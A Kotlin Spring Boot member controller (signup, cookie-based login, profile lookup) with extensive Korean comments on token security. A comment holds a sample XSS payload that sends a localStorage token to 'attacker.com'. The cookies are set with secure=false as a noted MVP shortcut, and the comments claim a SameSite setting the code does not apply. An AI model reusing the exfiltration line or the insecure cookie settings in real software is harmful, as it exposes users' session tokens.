package com.sparta.novel_insight.controller

import com.sparta.novel_insight.domain.Member
import com.sparta.novel_insight.dto.LoginRequest
import com.sparta.novel_insight.dto.SignupRequest
import com.sparta.novel_insight.repository.MemberRepository
import com.sparta.novel_insight.repository.PointRepository
import com.sparta.novel_insight.security.UserPrincipal
import com.sparta.novel_insight.service.PointService
import com.sparta.novel_insight.service.TokenService
import jakarta.servlet.http.Cookie
import jakarta.servlet.http.HttpServletRequest
import jakarta.servlet.http.HttpServletResponse
import org.springframework.http.HttpStatus
import org.springframework.http.ResponseEntity
import org.springframework.http.ResponseCookie
import org.springframework.security.core.annotation.AuthenticationPrincipal
import org.springframework.security.crypto.password.PasswordEncoder
import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.PostMapping
import org.springframework.web.bind.annotation.RequestBody
import org.springframework.web.bind.annotation.RestController
import java.time.Duration

//
// # MemberController - 회원 인증 및 관리 API
//
// ## 실무 권장사항 적용 (Production Best Practices)
//
// ### 1. HttpOnly Cookie 기반 인증
// - **문제**: 기존 방식은 토큰을 Response Body에 반환
// - 클라이언트가 localStorage/sessionStorage에 저장
// - XSS 공격 시 토큰 탈취 가능
//
// - **해결**: HttpOnly Cookie 사용
// - JavaScript로 접근 불가 → XSS 방지
// - Secure 속성: HTTPS에서만 전송 → 중간자 공격 방지
// - SameSite 속성: CSRF 방지
//
// ### 2. Access Token vs Refresh Token
// - **Access Token**: 짧은 수명 (1시간)
// - 모든 API 요청에 포함
// - Cookie Path: `/` (모든 경로)
//
// - **Refresh Token**: 긴 수명 (14일)
// - Token Refresh API에서만 사용
// - Cookie Path: `/api/auth` (제한된 경로)
// - DB에 저장하여 무효화 가능
//
// ### 3. CSRF 토큰
// - Cookie 기반 인증은 CSRF 공격에 취약
// - Spring Security의 CSRF 보호 활성화 필요
// - SameSite=Strict 설정으로 추가 방어
@RestController
class MemberController(
    private val memberRepository: MemberRepository,
    private val passwordEncoder: PasswordEncoder,
    private val tokenService: TokenService,
    private val pointService: PointService,
    private val pointRepository: PointRepository
) {

    @PostMapping("/signup")
    fun signup(@RequestBody request: SignupRequest): ResponseEntity<String> {
        val encodedPassword = passwordEncoder.encode(request.password)

        val newMember = Member(
            email = request.email,
            password = encodedPassword,
            nickname = request.nickname
        )

        val savedMember = memberRepository.save(newMember)
        pointService.createWallet(savedMember.id!!)

        return ResponseEntity
            .status(HttpStatus.CREATED)
            .body("회원가입 성공")
    }

    //
    // 로그인 API
    //
    // ## 실무 권장 인증 flow (Production Best Practices)
    //
    // ### 기존 방식의 문제점
    // ```kotlin
    // // ❌ 기존: Response Body에 토큰 반환
    // return ResponseEntity.ok(token)
    // ```
    // - 클라이언트가 localStorage에 저장
    // - XSS 공격 시 토큰 탈취 가능
    // ```javascript
    // // 공격자가 주입한 스크립트
    // fetch('https://attacker.com', {
    // method: 'POST',
    // body: localStorage.getItem('token')
    // })
    // ```
    //
    // ### 개선된 방식: HttpOnly Cookie
    // ```kotlin
    // // ✅ 개선: HttpOnly Cookie로 반환
    // response.addCookie(createAccessTokenCookie(accessToken))
    // ```
    // - JavaScript로 접근 불가 → XSS 방지
    // - 브라우저가 자동으로 Cookie 전송 → 편의성
    //
    // ## 프로세스
    // 1. 이메일/비밀번호 검증
    // 2. TokenService로 토큰 쌍 생성
    // 3. Access Token을 HttpOnly Cookie로 설정
    // 4. Refresh Token을 HttpOnly Cookie로 설정
    // 5. Response Body는 성공 메시지만 반환
    //
    // ## 클라이언트 사용법
    // ```javascript
    // // 로그인 요청
    // const response = await fetch('/login', {
    // method: 'POST',
    // headers: { 'Content-Type': 'application/json' },
    // body: JSON.stringify({ email, password }),
    // credentials: 'include'  // 중요: Cookie 전송 활성화
    // })
    //
    // // 이후 모든 API 요청
    // const data = await fetch('/api/novels', {
    // credentials: 'include'  // Cookie가 자동으로 전송됨
    // })
    // ```
    //
    // @param request 로그인 요청 (이메일, 비밀번호)
    // @param httpRequest HTTP 요청 (IP, User Agent 추출용)
    // @param httpResponse HTTP 응답 (Cookie 설정용)
    // @return 성공 메시지 (토큰은 Cookie로 전송)
    @PostMapping("/login")
    fun login(
        @RequestBody request: LoginRequest,
        httpRequest: HttpServletRequest,
        httpResponse: HttpServletResponse
    ): ResponseEntity<String> {
        // 1. 이메일로 사용자 조회
        val member = memberRepository.findByEmail(request.email)
            ?: return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("이메일 또는 비밀번호가 틀렸습니다.")

        // 2. 비밀번호 검증
        if (!passwordEncoder.matches(request.password, member.password)) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("이메일 또는 비밀번호가 틀렸습니다.")
        }

        // 3. 토큰 쌍 생성 (Access + Refresh)
        val tokenPair = tokenService.generateTokenPair(member, httpRequest)

        // 4. Access Token을 HttpOnly Cookie로 설정
        httpResponse.addCookie(createAccessTokenCookie(tokenPair.accessToken))

        // 5. Refresh Token을 HttpOnly Cookie로 설정
        httpResponse.addCookie(createRefreshTokenCookie(tokenPair.refreshToken))

        // 6. Response Body는 성공 메시지만 (토큰 포함 X)
        return ResponseEntity.ok("로그인 성공")
    }

    //
    // Access Token Cookie 생성
    //
    // ## Cookie 보안 속성
    // - **httpOnly = true**: JavaScript 접근 불가 (XSS 방지)
    // - **secure = false**: HTTPS에서만 전송 (MVP이므로 HTTP 허용)
    // - 프로덕션에서는 true로 변경 필수!
    // - **sameSite = Lax**: CSRF 방어 (일부 Cross-Site 요청 허용)
    // - Strict: 모든 Cross-Site 요청 차단 (엄격)
    // - Lax: GET 요청만 허용 (균형)
    // - None: 모든 요청 허용 (위험, HTTPS 필수)
    // - **path = /**: 모든 경로에서 Cookie 전송
    // - **maxAge = 3600**: 1시간 (Access Token 수명과 동일)
    //
    // ## SameSite 속성 설명
    // ### Strict (엄격)
    // - Cross-Site 요청 시 Cookie 전송 안 함
    // - 예: 외부 사이트 링크 클릭 시 로그인 상태 유지 안 됨
    // - 보안 최우선 서비스에 적합 (은행 등)
    //
    // ### Lax (균형) ← 우리가 사용
    // - Top-level navigation (주소창 직접 입력, 링크 클릭) 시에만 Cookie 전송
    // - AJAX, iframe 등에서는 전송 안 함
    // - 보안과 사용자 경험의 균형
    //
    // ### None (허용)
    // - 모든 Cross-Site 요청에 Cookie 전송
    // - Secure=true 필수
    // - 제3자 서비스 통합 시 사용
    private fun createAccessTokenCookie(token: String): Cookie {
        return Cookie("accessToken", token).apply {
            isHttpOnly = true        // JavaScript 접근 불가 (XSS 방지)
            secure = false           // MVP: HTTP 허용, 프로덕션: true로 변경
            path = "/"              // 모든 경로에서 전송
            maxAge = 3600           // 1시간 (Access Token 수명)
            // SameSite는 Cookie 클래스에서 직접 지원 안 됨
            // ResponseCookie 사용 시 설정 가능 (아래 주석 참고)
        }
    }

    //
    // Refresh Token Cookie 생성
    //
    // ## Access Token과의 차이점
    // - **maxAge = 1209600**: 14일 (Refresh Token 수명)
    // - **path = /api/auth**: Token Refresh API에서만 사용
    // - 다른 API 요청 시 불필요하게 전송되지 않음
    // - 보안: 노출 최소화
    //
    // ## Path 설정 이유
    // - Access Token: path="/" → 모든 API 요청에 필요
    // - Refresh Token: path="/api/auth" → Token Refresh API에서만 필요
    // - 불필요한 네트워크 트래픽 감소
    // - 보안: 공격 표면 축소
    private fun createRefreshTokenCookie(token: String): Cookie {
        return Cookie("refreshToken", token).apply {
            isHttpOnly = true        // JavaScript 접근 불가 (XSS 방지)
            secure = false           // MVP: HTTP 허용, 프로덕션: true로 변경
            path = "/api/auth"      // Token Refresh API에서만 전송
            maxAge = 1209600        // 14일 (Refresh Token 수명)
        }
    }

    //
    // Spring Boot 3.x의 ResponseCookie를 사용한 SameSite 설정 예시
    // (향후 개선 시 참고)
    //
    // ```kotlin
    // private fun createAccessTokenCookieV2(token: String): ResponseCookie {
    // return ResponseCookie.from("accessToken", token)
    // .httpOnly(true)
    // .secure(true)           // 프로덕션: true
    // .path("/")
    // .maxAge(Duration.ofHours(1))
    // .sameSite("Lax")        // SameSite 설정
    // .build()
    // }
    //
    // // Controller에서 사용
    // httpResponse.addHeader(HttpHeaders.SET_COOKIE, cookie.toString())
    // ```

    @GetMapping("/users/me")
    fun getMyInfo(@AuthenticationPrincipal user: UserPrincipal): ResponseEntity<Map<String, Any>> {
        val member = memberRepository.findById(user.id).orElseThrow()
        val point = pointRepository.findByMemberId(user.id)

        val response = mapOf(
            "id" to member.id!!, // ★ [추가] 내 ID를 내려줍니다.
            "email" to member.email,
            "nickname" to member.nickname,
            "point" to (point?.amount ?: 0)
        )
        return ResponseEntity.ok(response)
    }
}